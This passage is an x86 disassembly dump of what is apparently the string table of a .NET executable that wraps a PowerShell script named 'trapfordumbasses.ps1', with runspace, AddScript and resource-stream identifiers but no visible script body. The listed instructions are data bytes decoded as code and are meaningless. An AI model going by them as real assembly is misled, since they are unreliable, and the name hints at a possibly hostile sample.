  409164:	77 47                	ja     0x4091ad
  409166:	75 69                	jne    0x4091d1
  409168:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  40916c:	50                   	push   %eax
  40916d:	53                   	push   %ebx
  40916e:	4f                   	dec    %edi
  40916f:	62 6a 65             	bound  %ebp,0x65(%edx)
  409172:	63 74 00 41          	arpl   %esi,0x41(%eax,%eax,1)
  409176:	72 67                	jb     0x4091df
  409178:	75 6d                	jne    0x4091e7
  40917a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40917c:	74 4e                	je     0x4091cc
  40917e:	75 6c                	jne    0x4091ec
  409180:	6c                   	insb   (%dx),%es:(%edi)
  409181:	45                   	inc    %ebp
  409182:	78 63                	js     0x4091e7
  409184:	65 70 74             	gs jo  0x4091fb
  409187:	69 6f 6e 00 53 54 41 	imul   $0x41545300,0x6e(%edi),%ebp
  40918e:	54                   	push   %esp
  40918f:	68 72 65 61 64       	push   $0x64616572
  409194:	41                   	inc    %ecx
  409195:	74 74                	je     0x40920b
  409197:	72 69                	jb     0x409202
  409199:	62 75 74             	bound  %esi,0x74(%ebp)
  40919c:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  4091a0:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4091a3:	44                   	inc    %esp
  4091a4:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4091ab:	6c                   	insb   (%dx),%es:(%edi)
  4091ac:	61                   	popa
  4091ad:	73 73                	jae    0x409222
  4091af:	36 00 4d 61          	add    %cl,%ss:0x61(%ebp)
  4091b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b4:	75 61                	jne    0x409217
  4091b6:	6c                   	insb   (%dx),%es:(%edi)
  4091b7:	52                   	push   %edx
  4091b8:	65 73 65             	gs jae 0x409220
  4091bb:	74 45                	je     0x409202
  4091bd:	76 65                	jbe    0x409224
  4091bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c0:	74 00                	je     0x4091c2
  4091c2:	6d                   	insl   (%dx),%es:(%edi)
  4091c3:	72 65                	jb     0x40922a
  4091c5:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  4091c9:	61                   	popa
  4091ca:	41                   	inc    %ecx
  4091cb:	64 64 65 64 45       	fs fs gs fs inc %ebp
  4091d0:	76 65                	jbe    0x409237
  4091d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d3:	74 41                	je     0x409216
  4091d5:	72 67                	jb     0x40923e
  4091d7:	73 00                	jae    0x4091d9
  4091d9:	3c 4d                	cmp    $0x4d,%al
  4091db:	61                   	popa
  4091dc:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  4091e3:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  4091ea:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  4091ed:	31 00                	xor    %eax,(%eax)
  4091ef:	49                   	dec    %ecx
  4091f0:	41                   	inc    %ecx
  4091f1:	73 79                	jae    0x40926c
  4091f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091f4:	63 52 65             	arpl   %edx,0x65(%edx)
  4091f7:	73 75                	jae    0x40926e
  4091f9:	6c                   	insb   (%dx),%es:(%edi)
  4091fa:	74 00                	je     0x4091fc
  4091fc:	3c 4d                	cmp    $0x4d,%al
  4091fe:	61                   	popa
  4091ff:	69 6e 3e 62 5f 5f 32 	imul   $0x325f5f62,0x3e(%esi),%ebp
  409206:	00 61 72             	add    %ah,0x72(%ecx)
  409209:	00 50 53             	add    %dl,0x53(%eax)
  40920c:	44                   	inc    %esp
  40920d:	61                   	popa
  40920e:	74 61                	je     0x409271
  409210:	43                   	inc    %ebx
  409211:	6f                   	outsl  %ds:(%esi),(%dx)
  409212:	6c                   	insb   (%dx),%es:(%edi)
  409213:	6c                   	insb   (%dx),%es:(%edi)
  409214:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409219:	6e                   	outsb  %ds:(%esi),(%dx)
  40921a:	60                   	pusha
  40921b:	31 00                	xor    %eax,(%eax)
  40921d:	45                   	inc    %ebp
  40921e:	72 72                	jb     0x409292
  409220:	6f                   	outsl  %ds:(%esi),(%dx)
  409221:	72 52                	jb     0x409275
  409223:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  409227:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40922b:	74 5f                	je     0x40928c
  40922d:	49                   	dec    %ecx
  40922e:	6e                   	outsb  %ds:(%esi),(%dx)
  40922f:	64 65 78 00          	fs gs js 0x409233
  409233:	67 65 74 5f          	addr16 gs je 0x409296
  409237:	45                   	inc    %ebp
  409238:	78 63                	js     0x40929d
  40923a:	65 70 74             	gs jo  0x4092b1
  40923d:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  409244:	5f                   	pop    %edi
  409245:	4d                   	dec    %ebp
  409246:	65 73 73             	gs jae 0x4092bc
  409249:	61                   	popa
  40924a:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  40924f:	74 5f                	je     0x4092b0
  409251:	49                   	dec    %ecx
  409252:	73 43                	jae    0x409297
  409254:	6f                   	outsl  %ds:(%esi),(%dx)
  409255:	6d                   	insl   (%dx),%es:(%edi)
  409256:	70 6c                	jo     0x4092c4
  409258:	65 74 65             	gs je  0x4092c0
  40925b:	64 00 45 76          	add    %al,%fs:0x76(%ebp)
  40925f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409261:	74 57                	je     0x4092ba
  409263:	61                   	popa
  409264:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  40926b:	65 
  40926c:	00 53 65             	add    %dl,0x65(%ebx)
  40926f:	74 00                	je     0x409271
  409271:	45                   	inc    %ebp
  409272:	6e                   	outsb  %ds:(%esi),(%dx)
  409273:	61                   	popa
  409274:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  409278:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  40927f:	79 6c                	jns    0x4092ed
  409281:	65 73 00             	gs jae 0x409284
  409284:	55                   	push   %ebp
  409285:	6e                   	outsb  %ds:(%esi),(%dx)
  409286:	68 61 6e 64 6c       	push   $0x6c646e61
  40928b:	65 64 45             	gs fs inc %ebp
  40928e:	78 63                	js     0x4092f3
  409290:	65 70 74             	gs jo  0x409307
  409293:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  40929a:	74 48                	je     0x4092e4
  40929c:	61                   	popa
  40929d:	6e                   	outsb  %ds:(%esi),(%dx)
  40929e:	64 6c                	fs insb (%dx),%es:(%edi)
  4092a0:	65 72 00             	gs jb  0x4092a3
  4092a3:	61                   	popa
  4092a4:	64 64 5f             	fs fs pop %edi
  4092a7:	55                   	push   %ebp
  4092a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092a9:	68 61 6e 64 6c       	push   $0x6c646e61
  4092ae:	65 64 45             	gs fs inc %ebp
  4092b1:	78 63                	js     0x409316
  4092b3:	65 70 74             	gs jo  0x40932a
  4092b6:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4092bd:	74 65                	je     0x409324
  4092bf:	6d                   	insl   (%dx),%es:(%edi)
  4092c0:	2e 4d                	cs dec %ebp
  4092c2:	61                   	popa
  4092c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c4:	61                   	popa
  4092c5:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092c8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092ca:	74 2e                	je     0x4092fa
  4092cc:	41                   	inc    %ecx
  4092cd:	75 74                	jne    0x409343
  4092cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d0:	6d                   	insl   (%dx),%es:(%edi)
  4092d1:	61                   	popa
  4092d2:	74 69                	je     0x40933d
  4092d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d6:	2e 52                	cs push %edx
  4092d8:	75 6e                	jne    0x409348
  4092da:	73 70                	jae    0x40934c
  4092dc:	61                   	popa
  4092dd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4092e0:	00 52 75             	add    %dl,0x75(%edx)
  4092e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e4:	73 70                	jae    0x409356
  4092e6:	61                   	popa
  4092e7:	63 65 46             	arpl   %esp,0x46(%ebp)
  4092ea:	61                   	popa
  4092eb:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4092ef:	79 00                	jns    0x4092f1
  4092f1:	52                   	push   %edx
  4092f2:	75 6e                	jne    0x409362
  4092f4:	73 70                	jae    0x409366
  4092f6:	61                   	popa
  4092f7:	63 65 00             	arpl   %esp,0x0(%ebp)
  4092fa:	43                   	inc    %ebx
  4092fb:	72 65                	jb     0x409362
  4092fd:	61                   	popa
  4092fe:	74 65                	je     0x409365
  409300:	52                   	push   %edx
  409301:	75 6e                	jne    0x409371
  409303:	73 70                	jae    0x409375
  409305:	61                   	popa
  409306:	63 65 00             	arpl   %esp,0x0(%ebp)
  409309:	41                   	inc    %ecx
  40930a:	70 61                	jo     0x40936d
  40930c:	72 74                	jb     0x409382
  40930e:	6d                   	insl   (%dx),%es:(%edi)
  40930f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409311:	74 53                	je     0x409366
  409313:	74 61                	je     0x409376
  409315:	74 65                	je     0x40937c
  409317:	00 73 65             	add    %dh,0x65(%ebx)
  40931a:	74 5f                	je     0x40937b
  40931c:	41                   	inc    %ecx
  40931d:	70 61                	jo     0x409380
  40931f:	72 74                	jb     0x409395
  409321:	6d                   	insl   (%dx),%es:(%edi)
  409322:	65 6e                	outsb  %gs:(%esi),(%dx)
  409324:	74 53                	je     0x409379
  409326:	74 61                	je     0x409389
  409328:	74 65                	je     0x40938f
  40932a:	00 4f 70             	add    %cl,0x70(%edi)
  40932d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40932f:	00 50 6f             	add    %dl,0x6f(%eax)
  409332:	77 65                	ja     0x409399
  409334:	72 53                	jb     0x409389
  409336:	68 65 6c 6c 00       	push   $0x6c6c65
  40933b:	43                   	inc    %ebx
  40933c:	72 65                	jb     0x4093a3
  40933e:	61                   	popa
  40933f:	74 65                	je     0x4093a6
  409341:	00 73 65             	add    %dh,0x65(%ebx)
  409344:	74 5f                	je     0x4093a5
  409346:	52                   	push   %edx
  409347:	75 6e                	jne    0x4093b7
  409349:	73 70                	jae    0x4093bb
  40934b:	61                   	popa
  40934c:	63 65 00             	arpl   %esp,0x0(%ebp)
  40934f:	50                   	push   %eax
  409350:	53                   	push   %ebx
  409351:	44                   	inc    %esp
  409352:	61                   	popa
  409353:	74 61                	je     0x4093b6
  409355:	53                   	push   %ebx
  409356:	74 72                	je     0x4093ca
  409358:	65 61                	gs popa
  40935a:	6d                   	insl   (%dx),%es:(%edi)
  40935b:	73 00                	jae    0x40935d
  40935d:	67 65 74 5f          	addr16 gs je 0x4093c0
  409361:	53                   	push   %ebx
  409362:	74 72                	je     0x4093d6
  409364:	65 61                	gs popa
  409366:	6d                   	insl   (%dx),%es:(%edi)
  409367:	73 00                	jae    0x409369
  409369:	67 65 74 5f          	addr16 gs je 0x4093cc
  40936d:	45                   	inc    %ebp
  40936e:	72 72                	jb     0x4093e2
  409370:	6f                   	outsl  %ds:(%esi),(%dx)
  409371:	72 00                	jb     0x409373
  409373:	45                   	inc    %ebp
  409374:	76 65                	jbe    0x4093db
  409376:	6e                   	outsb  %ds:(%esi),(%dx)
  409377:	74 48                	je     0x4093c1
  409379:	61                   	popa
  40937a:	6e                   	outsb  %ds:(%esi),(%dx)
  40937b:	64 6c                	fs insb (%dx),%es:(%edi)
  40937d:	65 72 60             	gs jb  0x4093e0
  409380:	31 00                	xor    %eax,(%eax)
  409382:	61                   	popa
  409383:	64 64 5f             	fs fs pop %edi
  409386:	44                   	inc    %esp
  409387:	61                   	popa
  409388:	74 61                	je     0x4093eb
  40938a:	41                   	inc    %ecx
  40938b:	64 64 65 64 00 43 6f 	fs fs gs add %al,%fs:0x6f(%ebx)
  409392:	6d                   	insl   (%dx),%es:(%edi)
  409393:	70 6c                	jo     0x409401
  409395:	65 74 65             	gs je  0x4093fd
  409398:	00 43 6f             	add    %al,0x6f(%ebx)
  40939b:	6d                   	insl   (%dx),%es:(%edi)
  40939c:	70 61                	jo     0x4093ff
  40939e:	72 65                	jb     0x409405
  4093a0:	00 53 74             	add    %dl,0x74(%ebx)
  4093a3:	72 69                	jb     0x40940e
  4093a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a6:	67 43                	addr16 inc %ebx
  4093a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4093a9:	6d                   	insl   (%dx),%es:(%edi)
  4093aa:	70 61                	jo     0x40940d
  4093ac:	72 69                	jb     0x409417
  4093ae:	73 6f                	jae    0x40941f
  4093b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b1:	00 53 74             	add    %dl,0x74(%ebx)
  4093b4:	61                   	popa
  4093b5:	72 74                	jb     0x40942b
  4093b7:	73 57                	jae    0x409410
  4093b9:	69 74 68 00 53 74 72 	imul   $0x69727453,0x0(%eax,%ebp,2),%esi
  4093c0:	69 
  4093c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c2:	67 53                	addr16 push %ebx
  4093c4:	70 6c                	jo     0x409432
  4093c6:	69 74 4f 70 74 69 6f 	imul   $0x6e6f6974,0x70(%edi,%ecx,2),%esi
  4093cd:	6e 
  4093ce:	73 00                	jae    0x4093d0
  4093d0:	53                   	push   %ebx
  4093d1:	70 6c                	jo     0x40943f
  4093d3:	69 74 00 4d 65 73 73 	imul   $0x61737365,0x4d(%eax,%eax,1),%esi
  4093da:	61 
  4093db:	67 65 42             	addr16 gs inc %edx
  4093de:	6f                   	outsl  %ds:(%esi),(%dx)
  4093df:	78 42                	js     0x409423
  4093e1:	75 74                	jne    0x409457
  4093e3:	74 6f                	je     0x409454
  4093e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e6:	73 00                	jae    0x4093e8
  4093e8:	4d                   	dec    %ebp
  4093e9:	65 73 73             	gs jae 0x40945f
  4093ec:	61                   	popa
  4093ed:	67 65 42             	addr16 gs inc %edx
  4093f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4093f1:	78 49                	js     0x40943c
  4093f3:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4093f6:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4093fa:	6d                   	insl   (%dx),%es:(%edi)
  4093fb:	00 53 79             	add    %dl,0x79(%ebx)
  4093fe:	73 74                	jae    0x409474
  409400:	65 6d                	gs insl (%dx),%es:(%edi)
  409402:	2e 44                	cs inc %esp
  409404:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40940b:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  409412:	75 67                	jne    0x40947b
  409414:	67 65 72 00          	addr16 gs jb 0x409418
  409418:	4c                   	dec    %esp
  409419:	61                   	popa
  40941a:	75 6e                	jne    0x40948a
  40941c:	63 68 00             	arpl   %ebp,0x0(%eax)
  40941f:	53                   	push   %ebx
  409420:	79 73                	jns    0x409495
  409422:	74 65                	je     0x409489
  409424:	6d                   	insl   (%dx),%es:(%edi)
  409425:	2e 49                	cs dec %ecx
  409427:	4f                   	dec    %edi
  409428:	00 53 74             	add    %dl,0x74(%ebx)
  40942b:	72 65                	jb     0x409492
  40942d:	61                   	popa
  40942e:	6d                   	insl   (%dx),%es:(%edi)
  40942f:	00 47 65             	add    %al,0x65(%edi)
  409432:	74 4d                	je     0x409481
  409434:	61                   	popa
  409435:	6e                   	outsb  %ds:(%esi),(%dx)
  409436:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  40943d:	73 6f                	jae    0x4094ae
  40943f:	75 72                	jne    0x4094b3
  409441:	63 65 53             	arpl   %esp,0x53(%ebp)
  409444:	74 72                	je     0x4094b8
  409446:	65 61                	gs popa
  409448:	6d                   	insl   (%dx),%es:(%edi)
  409449:	00 45 6e             	add    %al,0x6e(%ebp)
  40944c:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40944f:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  409456:	5f                   	pop    %edi
  409457:	55                   	push   %ebp
  409458:	54                   	push   %esp
  409459:	46                   	inc    %esi
  40945a:	38 00                	cmp    %al,(%eax)
  40945c:	53                   	push   %ebx
  40945d:	74 72                	je     0x4094d1
  40945f:	65 61                	gs popa
  409461:	6d                   	insl   (%dx),%es:(%edi)
  409462:	52                   	push   %edx
  409463:	65 61                	gs popa
  409465:	64 65 72 00          	fs gs jb 0x409469
  409469:	54                   	push   %esp
  40946a:	65 78 74             	gs js  0x4094e1
  40946d:	52                   	push   %edx
  40946e:	65 61                	gs popa
  409470:	64 65 72 00          	fs gs jb 0x409474
  409474:	52                   	push   %edx
  409475:	65 61                	gs popa
  409477:	64 54                	fs push %esp
  409479:	6f                   	outsl  %ds:(%esi),(%dx)
  40947a:	45                   	inc    %ebp
  40947b:	6e                   	outsb  %ds:(%esi),(%dx)
  40947c:	64 00 46 69          	add    %al,%fs:0x69(%esi)
  409480:	6c                   	insb   (%dx),%es:(%edi)
  409481:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  409485:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  40948c:	65 
  40948d:	78 74                	js     0x409503
  40948f:	00 41 64             	add    %al,0x64(%ecx)
  409492:	64 53                	fs push %ebx
  409494:	63 72 69             	arpl   %esi,0x69(%edx)
  409497:	70 74                	jo     0x40950d
  409499:	00 53 79             	add    %dl,0x79(%ebx)
  40949c:	73 74                	jae    0x409512
  40949e:	65 6d                	gs insl (%dx),%es:(%edi)
  4094a0:	2e 54                	cs push %esp
  4094a2:	65 78 74             	gs js  0x409519
  4094a5:	2e 52                	cs push %edx
  4094a7:	65 67 75 6c          	gs addr16 jne 0x409517
  4094ab:	61                   	popa
  4094ac:	72 45                	jb     0x4094f3
  4094ae:	78 70                	js     0x409520
  4094b0:	72 65                	jb     0x409517
  4094b2:	73 73                	jae    0x409527
  4094b4:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  4094bb:	67 65 78 00          	addr16 gs js 0x4094bf
  4094bf:	4d                   	dec    %ebp
  4094c0:	61                   	popa
  4094c1:	74 63                	je     0x409526
  4094c3:	68 00 47 72 6f       	push   $0x6f724700
  4094c8:	75 70                	jne    0x40953a
  4094ca:	00 67 65             	add    %ah,0x65(%edi)
  4094cd:	74 5f                	je     0x40952e
  4094cf:	53                   	push   %ebx
  4094d0:	75 63                	jne    0x409535
  4094d2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4094d5:	73 00                	jae    0x4094d7
  4094d7:	47                   	inc    %edi
  4094d8:	72 6f                	jb     0x409549
  4094da:	75 70                	jne    0x40954c
  4094dc:	43                   	inc    %ebx
  4094dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4094de:	6c                   	insb   (%dx),%es:(%edi)
  4094df:	6c                   	insb   (%dx),%es:(%edi)
  4094e0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4094e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e6:	00 67 65             	add    %ah,0x65(%edi)
  4094e9:	74 5f                	je     0x40954a
  4094eb:	47                   	inc    %edi
  4094ec:	72 6f                	jb     0x40955d
  4094ee:	75 70                	jne    0x409560
  4094f0:	73 00                	jae    0x4094f2
  4094f2:	44                   	inc    %esp
  4094f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4094f4:	75 62                	jne    0x409558
  4094f6:	6c                   	insb   (%dx),%es:(%edi)
  4094f7:	65 00 54 72 79       	add    %dl,%gs:0x79(%edx,%esi,2)
  4094fc:	50                   	push   %eax
  4094fd:	61                   	popa
  4094fe:	72 73                	jb     0x409573
  409500:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  409504:	64 50                	fs push %eax
  409506:	61                   	popa
  409507:	72 61                	jb     0x40956a
  409509:	6d                   	insl   (%dx),%es:(%edi)
  40950a:	65 74 65             	gs je  0x409572
  40950d:	72 00                	jb     0x40950f
  40950f:	43                   	inc    %ebx
  409510:	61                   	popa
  409511:	70 74                	jo     0x409587
  409513:	75 72                	jne    0x409587
  409515:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409519:	74 5f                	je     0x40957a
  40951b:	56                   	push   %esi
  40951c:	61                   	popa
  40951d:	6c                   	insb   (%dx),%es:(%edi)
  40951e:	75 65                	jne    0x409585
  409520:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  409524:	70 70                	jo     0x409596
  409526:	65 72 00             	gs jb  0x409529
  409529:	42                   	inc    %edx
  40952a:	6f                   	outsl  %ds:(%esi),(%dx)
  40952b:	6f                   	outsl  %ds:(%esi),(%dx)
  40952c:	6c                   	insb   (%dx),%es:(%edi)
  40952d:	65 61                	gs popa
  40952f:	6e                   	outsb  %ds:(%esi),(%dx)
  409530:	00 41 64             	add    %al,0x64(%ecx)
  409533:	64 41                	fs inc %ecx
  409535:	72 67                	jb     0x40959e
  409537:	75 6d                	jne    0x4095a6
  409539:	65 6e                	outsb  %gs:(%esi),(%dx)
  40953b:	74 00                	je     0x40953d
  40953d:	41                   	inc    %ecx
  40953e:	64 64 43             	fs fs inc %ebx
  409541:	6f                   	outsl  %ds:(%esi),(%dx)
  409542:	6d                   	insl   (%dx),%es:(%edi)
  409543:	6d                   	insl   (%dx),%es:(%edi)
  409544:	61                   	popa
  409545:	6e                   	outsb  %ds:(%esi),(%dx)
  409546:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  40954a:	79 6e                	jns    0x4095ba
  40954c:	63 43 61             	arpl   %eax,0x61(%ebx)
  40954f:	6c                   	insb   (%dx),%es:(%edi)
  409550:	6c                   	insb   (%dx),%es:(%edi)
  409551:	62 61 63             	bound  %esp,0x63(%ecx)
  409554:	6b 00 50             	imul   $0x50,(%eax),%eax
  409557:	53                   	push   %ebx
  409558:	49                   	dec    %ecx
  409559:	6e                   	outsb  %ds:(%esi),(%dx)
  40955a:	76 6f                	jbe    0x4095cb
  40955c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40955f:	69 6f 6e 53 65 74 74 	imul   $0x74746553,0x6e(%edi),%ebp
  409566:	69 6e 67 73 00 42 65 	imul   $0x65420073,0x67(%esi),%ebp
  40956d:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
  409574:	6b 
  409575:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  409579:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  409580:	65 
  409581:	00 57 61             	add    %dl,0x61(%edi)
  409584:	69 74 4f 6e 65 00 50 	imul   $0x53500065,0x6e(%edi,%ecx,2),%esi
  40958b:	53 
  40958c:	49                   	dec    %ecx
  40958d:	6e                   	outsb  %ds:(%esi),(%dx)
  40958e:	76 6f                	jbe    0x4095ff
  409590:	63 61 74             	arpl   %esp,0x74(%ecx)
  409593:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40959a:	65 49                	gs dec %ecx
  40959c:	6e                   	outsb  %ds:(%esi),(%dx)
  40959d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40959f:	00 67 65             	add    %ah,0x65(%edi)
  4095a2:	74 5f                	je     0x409603
  4095a4:	49                   	dec    %ecx
  4095a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a6:	76 6f                	jbe    0x409617
  4095a8:	63 61 74             	arpl   %esp,0x74(%ecx)
  4095ab:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4095b2:	65 49                	gs dec %ecx
  4095b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4095b7:	00 50 53             	add    %dl,0x53(%eax)
  4095ba:	49                   	dec    %ecx
  4095bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4095bc:	76 6f                	jbe    0x40962d
  4095be:	63 61 74             	arpl   %esp,0x74(%ecx)
  4095c1:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4095c8:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4095cc:	74 5f                	je     0x40962d
  4095ce:	53                   	push   %ebx
  4095cf:	74 61                	je     0x409632
  4095d1:	74 65                	je     0x409638
  4095d3:	00 67 65             	add    %ah,0x65(%edi)
  4095d6:	74 5f                	je     0x409637
  4095d8:	52                   	push   %edx
  4095d9:	65 61                	gs popa
  4095db:	73 6f                	jae    0x40964c
  4095dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4095de:	00 43 6f             	add    %al,0x6f(%ebx)
  4095e1:	6d                   	insl   (%dx),%es:(%edi)
  4095e2:	70 69                	jo     0x40964d
  4095e4:	6c                   	insb   (%dx),%es:(%edi)
  4095e5:	65 72 47             	gs jb  0x40962f
  4095e8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095ea:	65 72 61             	gs jb  0x40964e
  4095ed:	74 65                	je     0x409654
  4095ef:	64 41                	fs inc %ecx
  4095f1:	74 74                	je     0x409667
  4095f3:	72 69                	jb     0x40965e
  4095f5:	62 75 74             	bound  %esi,0x74(%ebp)
  4095f8:	65 00 74 72 61       	add    %dh,%gs:0x61(%edx,%esi,2)
  4095fd:	70 66                	jo     0x409665
  4095ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409600:	72 64                	jb     0x409666
  409602:	75 6d                	jne    0x409671
  409604:	62 61 73             	bound  %esp,0x73(%ecx)
  409607:	73 65                	jae    0x40966e
  409609:	73 2e                	jae    0x409639
  40960b:	70 73                	jo     0x409680
  40960d:	31 00                	xor    %eax,(%eax)
  40960f:	00 00                	add    %al,(%eax)
  409611:	01 00                	add    %eax,(%eax)
  409613:	21 53 00             	and    %edx,0x0(%ebx)
  409616:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40961a:	75 00                	jne    0x40961c
  40961c:	72 00                	jb     0x40961e
  40961e:	65 00 20             	add    %ah,%gs:(%eax)
  409621:	00 69 00             	add    %ch,0x0(%ecx)
  409624:	6e                   	outsb  %ds:(%esi),(%dx)
  409625:	00 70 00             	add    %dh,0x0(%eax)
  409628:	75 00                	jne    0x40962a
  40962a:	74 00                	je     0x40962c
  40962c:	3a 00                	cmp    (%eax),%al
  40962e:	20 00                	and    %al,(%eax)
  409630:	20 00                	and    %al,(%eax)
  409632:	20 00                	and    %al,(%eax)
  409634:	00 21                	add    %ah,(%ecx)
  409636:	49                   	dec    %ecx
  409637:	00 6e 00             	add    %ch,0x0(%esi)
  40963a:	70 00                	jo     0x40963c
  40963c:	75 00                	jne    0x40963e
  40963e:	74 00                	je     0x409640
  409640:	3a 00                	cmp    (%eax),%al
  409642:	20 00                	and    %al,(%eax)
  409644:	20 00                	and    %al,(%eax)
  409646:	20 00                	and    %al,(%eax)
  409648:	20 00                	and    %al,(%eax)
  40964a:	20 00                	and    %al,(%eax)
  40964c:	20 00                	and    %al,(%eax)
  40964e:	20 00                	and    %al,(%eax)
  409650:	20 00                	and    %al,(%eax)
  409652:	20 00                	and    %al,(%eax)
  409654:	20 00                	and    %al,(%eax)
  409656:	00 05 4f 00 4b 00    	add    %al,0x4b004f
  40965c:	00 0d 43 00 61 00    	add    %cl,0x610043
  409662:	6e                   	outsb  %ds:(%esi),(%dx)
  409663:	00 63 00             	add    %ah,0x0(%ebx)
  409666:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  40966b:	03 00                	add    (%eax),%eax
  40966d:	00 01                	add    %al,(%ecx)
  40966f:	17                   	pop    %ss
  409670:	50                   	push   %eax
  409671:	00 72 00             	add    %dh,0x0(%edx)
  409674:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409678:	73 00                	jae    0x40967a
  40967a:	20 00                	and    %al,(%eax)
  40967c:	61                   	popa
  40967d:	00 20                	add    %ah,(%eax)
  40967f:	00 6b 00             	add    %ch,0x0(%ebx)
  409682:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  409686:	00 0f                	add    %cl,(%edi)
  409688:	23 00                	and    (%eax),%eax
  40968a:	30 00                	xor    %al,(%eax)
  40968c:	30 00                	xor    %al,(%eax)
  40968e:	30 00                	xor    %al,(%eax)
  409690:	30 00                	xor    %al,(%eax)
  409692:	38 00                	cmp    %al,(%eax)
  409694:	30 00                	xor    %al,(%eax)
  409696:	00 0f                	add    %cl,(%edi)
  409698:	23 00                	and    (%eax),%eax
  40969a:	38 00                	cmp    %al,(%eax)
  40969c:	30 00                	xor    %al,(%eax)
  40969e:	38 00                	cmp    %al,(%eax)
  4096a0:	30 00                	xor    %al,(%eax)
  4096a2:	38 00                	cmp    %al,(%eax)
  4096a4:	30 00                	xor    %al,(%eax)
  4096a6:	00 0f                	add    %cl,(%edi)
  4096a8:	23 00                	and    (%eax),%eax
  4096aa:	30 00                	xor    %al,(%eax)
  4096ac:	30 00                	xor    %al,(%eax)
  4096ae:	38 00                	cmp    %al,(%eax)
  4096b0:	30 00                	xor    %al,(%eax)
  4096b2:	30 00                	xor    %al,(%eax)
  4096b4:	30 00                	xor    %al,(%eax)
  4096b6:	00 0f                	add    %cl,(%edi)
  4096b8:	23 00                	and    (%eax),%eax
